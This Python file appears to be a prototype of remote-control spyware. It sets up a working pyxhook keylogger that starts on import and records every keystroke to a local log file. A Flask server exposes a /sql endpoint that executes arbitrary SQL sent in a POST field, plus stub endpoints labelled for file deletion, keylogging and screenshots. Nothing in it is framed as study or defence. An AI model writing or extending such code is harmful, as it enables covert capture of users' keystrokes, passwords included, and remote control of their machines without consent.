#!/usr/bin/env python3
import socket
import os
import pyxhook
import requests
from flask import Flask
from flask import request
import sqlite3

host = socket.gethostname() #
port = 8080  # Specify the port to connect to

mydb = sqlite3.connect("user.db")

# Creating an instance of 'cursor' class
# which is used to execute the 'SQL'
# statements in 'Python'
cursor = mydb.cursor()
app = Flask(__name__)

import os
import time
import threading  # Import threading module to run the keylogger in a separate thread

def start_key_logger(duration):

    # This tells the keylogger where the log file will go.
    log_file = os.environ.get('pylogger_file', os.path.expanduser('./file.log'))

    # Allow setting the cancel key from environment args, Default: `
    cancel_key = ord(os.environ.get('pylogger_cancel', '`')[0])

    # Allow clearing the log file on start, if pylogger_clean is defined.
    if os.environ.get('pylogger_clean', None) is not None:
        try:
            os.remove(log_file)
        except EnvironmentError:
            # File does not exist, or no permissions.
            pass

    # creating key pressing event and saving it into log file
    def on_key_press(event):
        with open(log_file, 'a') as f:
            f.write('{}\n'.format(event.Key))

    # Create a hook manager object
    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = on_key_press

    # Set the hook
    new_hook.HookKeyboard()

    # Start the keylogger in a separate thread
    def run_keylogger():
        try:
            new_hook.start()  # Start the hook
        except KeyboardInterrupt:
            # User cancelled from command line.
            pass
        except Exception as ex:
            # Write exceptions to the log file, for analysis later.
            msg = 'Error while catching events:\n  {}'.format(ex)
            pyxhook.print_err(msg)
            with open(log_file, 'a') as f:
                f.write('\n{}'.format(msg))

    keylogger_thread = threading.Thread(target=run_keylogger)
    keylogger_thread.start()

    # Wait for the specified duration
    keylogger_thread.join(duration)

    # Stop the keylogger
    new_hook.cancel()

# Example usage: Run the keylogger for 10 seconds
start_key_logger(10)
@app.route('/')
def hello_world():
    return 'Hello world!'

@app.post('/sql')
def sql_file():
    print(request.form.get('parameter'))
    cursor.execute(request.form.get('parameter'))
    result = cursor.fetchall()
    return result
@app.post('/delete',)
# do the file deletion
def delete_file():
    pass
@app.post('/key')
# do the keylog
def keylogger():
    pass
@app.post('/shot')
# do the screenshot
def screenshot():
    pass